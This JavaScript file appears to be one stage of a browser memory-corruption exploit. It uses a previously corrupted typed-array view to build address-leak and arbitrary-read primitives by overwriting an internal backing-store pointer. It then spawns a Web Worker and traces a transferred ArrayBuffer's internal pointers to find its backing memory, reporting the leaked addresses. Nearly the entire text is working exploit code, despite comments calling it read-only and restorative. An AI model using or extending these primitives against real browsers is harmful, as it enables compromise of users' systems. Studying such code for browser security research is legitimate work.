// Read-only cross-thread anchor: locate a worker-created, transferred marker
// through its live ArrayBuffer cell. All browser pointer changes are restored.
return new Promise(function (resolve) {
  var state = window.__fw14ArrayState;
  var worker = null;
  var workerUrl = null;
  var timer = null;
  var settled = false;
  var phase = "preflight";
  function finish(status, details) {
    if (settled) return;
    settled = true;
    if (timer !== null) clearTimeout(timer);
    if (worker) worker.terminate();
    if (workerUrl) URL.revokeObjectURL(workerUrl);
    resolve([{ id: "worker_anchor_v1", status: status, details: details }]);
  }
  try {
    if (!state || !state.view || !state.array || !state.a ||
        !state.ownedTypedView || !state.calibratedViewBase ||
        state.array[0] !== state.a)
      throw new Error("held_view_missing");
    var forged = state.view;
    var a = state.ownedTypedView;
    var base = state.calibratedViewBase;
    if (a.length !== 65536 || a[0] !== 0x31 || a[7] !== 0xa8 ||
        !Number.isSafeInteger(base) || base % 4096 !== 0)
      throw new Error("held_view_canary_or_base_changed");
    function bytesAt(index) {
      var out = [];
      for (var i = 0; i < 8; i++) out.push(forged[index + i]);
      return out;
    }
    function integerOf(bytes) {
      var out = 0;
      for (var i = 7; i >= 0; i--) out = out * 256 + bytes[i];
      return out;
    }
    function pointerBytes(value) {
      var out = [];
      for (var i = 0; i < 8; i++)
        out.push(Math.floor(value / Math.pow(2, i * 8)) & 255);
      return out;
    }
    function addressOf(value) {
      try {
        state.array[0] = value;
        return integerOf(bytesAt(state.index));
      } finally {
        state.array[0] = state.a;
      }
    }
    var aIndex = addressOf(a) - base;
    var slot = aIndex + 8;
    if (!Number.isSafeInteger(slot) || slot < 0 || slot + 8 >= 16777216)
      throw new Error("owned_pointer_slot_outside_view");
    var original = bytesAt(slot);
    function readAt(address) {
      if (!Number.isSafeInteger(address) || address < 0x100000000 ||
          address >= 0x1000000000000 || address % 8 !== 0)
        throw new Error("candidate_address_invalid");
      var next = pointerBytes(address);
      try {
        for (var i = 0; i < 8; i++) forged[slot + i] = next[i];
        var out = [];
        for (var j = 0; j < 24; j++) out.push(a[j]);
        return out;
      } finally {
        for (var k = 0; k < 8; k++) forged[slot + k] = original[k];
      }
    }
    function u32(bytes, at) {
      return (bytes[at] | (bytes[at + 1] << 8) |
              (bytes[at + 2] << 16) | (bytes[at + 3] << 24)) >>> 0;
    }
    function ptr(bytes, at) {
      return integerOf(bytes.slice(at, at + 8));
    }
    function validPointer(value) {
      return Number.isSafeInteger(value) && value >= 0x100000000 &&
             value < 0x1000000000000 && value % 8 === 0;
    }
    phase = "worker_create";
    if (typeof Worker !== "function" || typeof Blob !== "function")
      throw new Error("worker_unavailable");
    var workerSource = [
      "var marker = new Uint32Array(4);",
      "var roots = [];",
      "self.onmessage = function () {",
      "  var leak = { value: null };",
      "  var master = new Uint32Array(6);",
      "  var victim = new DataView(new ArrayBuffer(48));",
      "  marker[0] = 0x7a6b5c4d; marker[1] = 0x1234cafe;",
      "  marker[2] = 0x55aa33cc; marker[3] = 0xcc33aa55;",
      "  marker.leak = leak; marker.master = master; marker.victim = victim;",
      "  roots = [marker, leak, master, victim];",
      "  self.postMessage({ typed: marker }, [marker.buffer]);",
      "};"
    ].join("\n");
    workerUrl = URL.createObjectURL(new Blob([workerSource],
                                        { type: "text/javascript" }));
    worker = new Worker(workerUrl);
    timer = setTimeout(function () {
      finish("error", { phase: "worker_reply", error: "timeout" });
    }, 6000);
    worker.onerror = function (event) {
      finish("error", { phase: "worker", error: String(event.message || "worker_error").slice(0, 180) });
    };
    worker.onmessage = function (event) {
      if (settled) return;
      try {
        phase = "transferred_marker";
        var typed = event.data && event.data.typed;
        var markersOk = typed instanceof Uint32Array && typed.length === 4 &&
          typed[0] === 0x7a6b5c4d && typed[1] === 0x1234cafe &&
          typed[2] === 0x55aa33cc && typed[3] === 0xcc33aa55;
        if (!markersOk) throw new Error("transferred_marker_mismatch");
        phase = "buffer_cell";
        var cell = addressOf(typed.buffer);
        if (!validPointer(cell)) throw new Error("buffer_cell_invalid");
        var cellBytes = readAt(cell);
        var impl = ptr(cellBytes, 0x10);
        if (!validPointer(impl)) throw new Error("buffer_impl_invalid");
        phase = "buffer_impl";
        var implBytes = readAt(impl);
        var data = ptr(implBytes, 0x10);
        if (!validPointer(data)) throw new Error("buffer_data_invalid");
        phase = "worker_backing";
        var backing = readAt(data);
        var backingOk = u32(backing, 0) === 0x7a6b5c4d &&
          u32(backing, 4) === 0x1234cafe &&
          u32(backing, 8) === 0x55aa33cc &&
          u32(backing, 12) === 0xcc33aa55;
        var restored = a[0] === 0x31 && a[7] === 0xa8 &&
          integerOf(bytesAt(slot)) === integerOf(original) &&
          state.array[0] === state.a;
        finish(backingOk && restored ? "pass" : "fail",
               { cell: "0x" + cell.toString(16),
                 impl: "0x" + impl.toString(16),
                 data: "0x" + data.toString(16),
                 marker_match: backingOk, restored: restored });
      } catch (error) {
        finish("error", { phase: phase, error: String(error).slice(0, 180) });
      }
    };
    worker.postMessage({ start: true });
  } catch (error) {
    finish("error", { phase: phase, error: String(error).slice(0, 180) });
  }
});
